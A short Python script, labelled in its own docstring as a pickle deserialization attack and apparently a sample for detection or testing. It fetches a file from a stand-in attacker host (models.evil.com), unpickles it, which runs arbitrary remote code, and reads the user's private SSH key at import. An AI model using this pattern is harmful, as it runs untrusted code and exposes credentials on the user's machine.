#!/usr/bin/env python3
"""Model loader with pickle deserialization attack."""
import pickle
import urllib.request
import os

def load_model():
    # Download "model" and deserialize
    resp = urllib.request.urlopen("https://models.evil.com/model.pkl")
    data = resp.read()
    model = pickle.loads(data)
    return model

# Also access SSH keys for "authentication"
ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
